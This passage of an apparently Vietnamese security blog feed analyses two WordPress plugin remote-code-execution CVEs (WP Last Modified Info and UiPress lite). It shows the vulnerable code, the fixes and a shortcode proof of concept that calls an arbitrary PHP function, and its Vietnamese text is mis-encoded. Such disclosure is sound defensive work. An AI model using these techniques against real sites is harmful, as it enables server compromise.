ƒë∆∞·ª£c g·ªçi ta c·∫ßn ph·∫£i v∆∞·ª£t qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $this-&amp;gt;is_enabled( &amp;#39;enable_last_modified_cb&amp;#39; ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c c·∫ßn ph·∫£i b·∫≠t option:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/option.png&#34; title=&#34;Show Info on Frontend&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Show Info on Frontend&lt;/h2&gt;&lt;p&gt;Show Info on Frontend&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/option.png&#39; alt=&#34;Show Info on Frontend&#34; height=&#34;390&#34; width=&#34;1034&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Show Info on Frontend&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Contributor adds shortcode [lmt-post-modified-info hide_archive=&amp;#39;...&amp;#39;] in post&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress loads the post content&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Shortcode::render($atts) is executed&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$atts[&amp;#39;hide_archive&amp;#39;] is parsed and trimmed into list of callbacks&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;For each $callback in list&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;is_callable($callback)?&amp;#34;}&#xA;F --&amp;gt;|Yes| G[&amp;#34;Invoke $callback()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;D√πng t√†i kho·∫£n Administrator ƒë·ªÉ b·∫≠t option &lt;code&gt;Show Info on Frontend&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;ƒêƒÉng nh·∫≠p v·ªõi user &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o post v·ªõi shortcode&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[lmt-post-modified-info hide_archive=phpinfo]&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Submit v√† preview:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#39; alt=&#34;Result&#34; height=&#34;808&#34; width=&#34;1237&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;strong&gt;WP Last Modified Info &amp;lt;= 1.9.4&lt;/strong&gt; cho ph√©p &lt;strong&gt;Contributor&lt;/strong&gt; ch√®n shortcode v·ªõi t√™n h√†m PHP tu·ª≥ √Ω trong &lt;code&gt;hide_archive&lt;/code&gt;. C√°c h√†m n√†y ƒë∆∞·ª£c ki·ªÉm tra b·∫±ng &lt;code&gt;is_callable()&lt;/code&gt; v√† g·ªçi tr·ª±c ti·∫øp, d·∫´n ƒë·∫øn &lt;strong&gt;Remote Code Execution&lt;/strong&gt;. B·∫£n v√° 1.9.5 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch gi·ªõi h·∫°n ch·ªâ g·ªçi c√°c h√†m an to√†n (whitelist).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng g·ªçi h√†m tr·ª±c ti·∫øp t·ª´ input ng∆∞·ªùi d√πng, k·ªÉ c·∫£ v·ªõi &lt;code&gt;is_callable()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu d√πng dynamic callback, lu√¥n d√πng &lt;strong&gt;whitelist&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Shortcode l√† ƒëi·ªÉm t·∫•n c√¥ng ti·ªÅm ·∫©n; c·∫ßn ki·ªÉm so√°t input v√† quy·ªÅn ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-last-modified-info/vulnerability/wordpress-wp-last-modified-info-plugin-1-9-2-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin &amp;lt;= 1.9.4 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3053 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-01-cve-2025-3053/</link>
      <pubDate>Mon, 01 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-01-cve-2025-3053/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | plugin t·∫°o &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt; v√† &lt;strong&gt;pages&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; m·ªôt c√°ch d·ªÖ d√†ng t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Remote Code Execution&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;3.5.07&lt;/strong&gt; th√¥ng qua h√†m &lt;strong&gt;uip_process_form_input()&lt;/strong&gt;. Nguy√™n nh√¢n l√† do h√†m n√†y l·∫•y c√°c &lt;strong&gt;input do ng∆∞·ªùi d√πng cung c·∫•p&lt;/strong&gt; ƒë·ªÉ th·ª±c thi c√°c &lt;strong&gt;h√†m t√πy √Ω&lt;/strong&gt; v·ªõi &lt;strong&gt;d·ªØ li·ªáu t√πy √Ω&lt;/strong&gt;, v√† &lt;strong&gt;kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra capability n√†o&lt;/strong&gt;. ƒêi·ªÅu n√†y khi·∫øn c√°c &lt;strong&gt;attackers ƒë√£ x√°c th·ª±c&lt;/strong&gt;, v·ªõi quy·ªÅn truy c·∫≠p c·∫•p &lt;strong&gt;Subscriber&lt;/strong&gt; tr·ªü l√™n, c√≥ th·ªÉ &lt;strong&gt;th·ª±c thi m√£ t√πy √Ω&lt;/strong&gt; tr√™n &lt;strong&gt;m√°y ch·ªß&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3053&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3053&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.07&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UiPress lite&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.07&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v3.5.07):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_process_form_input()&#xA;{&#xA;    // Check security nonce and &amp;#39;DOING_AJAX&amp;#39; global&#xA;    Ajax::check_referer();&#xA;&#xA;    $data = json_decode(stripslashes($_POST[&amp;#34;formData&amp;#34;]));&#xA;    $data = Sanitize::clean_input_with_code($data);&#xA;&#xA;    $userFunction = sanitize_text_field($_POST[&amp;#34;userFunction&amp;#34;]);&#xA;&#xA;    if (!function_exists($userFunction)) {&#xA;        Ajax::error(__(&amp;#39;Passed function doesn\&amp;#39;t exist&amp;#39;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;&#xA;    // Try to start user supplied function&#xA;    try {&#xA;        $userFunction($data);&#xA;    } catch (Exception $e) {&#xA;        // Catch function error&#xA;        Ajax::error($e-&amp;gt;getMessage());&#xA;    }&#xA;&#xA;    $returndata = [];&#xA;    $returndata[&amp;#34;success&amp;#34;] = true;&#xA;    wp_send_json($returndata);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;uip_process_form_input()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi th√¥ng qua AJAX v√† ch·ªâ d·ª±a v√†o &lt;code&gt;Ajax::check_referer()&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra nonce v√† x√°c nh·∫≠n y√™u c·∫ßu ƒëang ch·∫°y trong ng·ªØ c·∫£nh &lt;code&gt;DOING_AJAX&lt;/code&gt;. C∆° ch·∫ø n√†y &lt;strong&gt;kh√¥ng ki·ªÉm tra quy·ªÅn (capability) c·ªßa ng∆∞·ªùi d√πng&lt;/strong&gt; nh∆∞ &lt;code&gt;current_user_can()&lt;/code&gt;, m√† ch·ªâ x√°c minh t√≠nh h·ª£p l·ªá c·ªßa y√™u c·∫ßu. V√¨ v·∫≠y, ng∆∞·ªùi d√πng ƒë√£ x√°c th·ª±c (Subscriber tr·ªü l√™n) c√≥ th·ªÉ ch·ªâ ƒë·ªãnh b·∫•t k·ª≥ h√†m PHP h·ª£p l·ªá n√†o ‚Üí d·∫´n ƒë·∫øn &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    $doingAjax = defined(&amp;#34;DOING_AJAX&amp;#34;) &amp;amp;&amp;amp; DOING_AJAX ? true : false;&#xA;    $referer = check_ajax_referer(&amp;#34;uip-security-nonce&amp;#34;, &amp;#34;security&amp;#34;) &amp;gt; 0 ? true : false;&#xA;    $result = $doingAjax &amp;amp;&amp;amp; $referer ? true : false;&#xA;&#xA;    // Abort if not doing ajax or bad referer&#xA;    if (!$result) {&#xA;        $message = __(&amp;#34;Unable to perform action&amp;#34;, &amp;#34;uipress-lite&amp;#34;);&#xA;        self::error($message);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;D·ªØ li·ªáu t·ª´ &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng &lt;code&gt;stripslashes()&lt;/code&gt; r·ªìi ƒë∆∞a v√†o &lt;code&gt;json_decode()&lt;/code&gt;, v√¨ v·∫≠y &lt;code&gt;$data&lt;/code&gt; th∆∞·ªùng l√† m·ªôt &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt; (ho·∫∑c ki·ªÉu d·ªØ li·ªáu t∆∞∆°ng ·ª©ng v·ªõi n·ªôi dung JSON). Sau ƒë√≥ gi√° tr·ªã n√†y ƒë∆∞·ª£c truy·ªÅn th√™m qua &lt;code&gt;Sanitize::clean_input_with_code()&lt;/code&gt;, tuy c√≥ t√°c d·ª•ng l·ªçc d·ªØ li·ªáu, nh∆∞ng &lt;strong&gt;kh√¥ng ki·ªÉm so√°t vi·ªác th·ª±c thi h√†m&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;N·∫øu truy·ªÅn &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; ·ªü d·∫°ng chu·ªói m√† kh√¥ng ph·∫£i d·∫°ng JSON &amp;ldquo;{}&amp;rdquo; th√¨ &lt;code&gt;json_decode()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ chu·ªói m√† kh√¥ng ph·∫£i &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt;. Ta c√≥ th·ªÉ control &lt;code&gt;$data&lt;/code&gt; m·ªôt c√°ch tr·ªçn v·∫πn nh·∫•t&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Ti·∫øp theo, t√™n h√†m ƒë∆∞·ª£c l·∫•y t·ª´ &lt;code&gt;$_POST[&amp;quot;userFunction&amp;quot;]&lt;/code&gt; v√† ch·ªâ ƒë∆∞·ª£c ki·ªÉm tra b·∫±ng &lt;code&gt;function_exists()&lt;/code&gt;. ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† &lt;strong&gt;b·∫•t k·ª≥ h√†m PHP h·ª£p l·ªá n√†o ƒëang t·ªìn t·∫°i trong m√¥i tr∆∞·ªùng WordPress/PHP ƒë·ªÅu c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi&lt;/strong&gt;, mi·ªÖn l√† attacker bi·∫øt ho·∫∑c ƒëo√°n ƒë∆∞·ª£c t√™n h√†m ƒë√≥.&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng, d√≤ng &lt;code&gt;$userFunction($data);&lt;/code&gt; th·ª±c hi·ªán &lt;strong&gt;dynamic function call&lt;/strong&gt; v·ªõi tham s·ªë l√† d·ªØ li·ªáu do ng∆∞·ªùi d√πng g·ª≠i l√™n. Vi·ªác cho ph√©p ng∆∞·ªùi d√πng ki·ªÉm so√°t tr·ª±c ti·∫øp t√™n h√†m ƒë∆∞·ª£c g·ªçi, m√† kh√¥ng d√πng whitelist v√† kh√¥ng ki·ªÉm tra quy·ªÅn, t·∫°o ra &lt;strong&gt;l·ªó h·ªïng Remote Code Execution (RCE)&lt;/strong&gt; 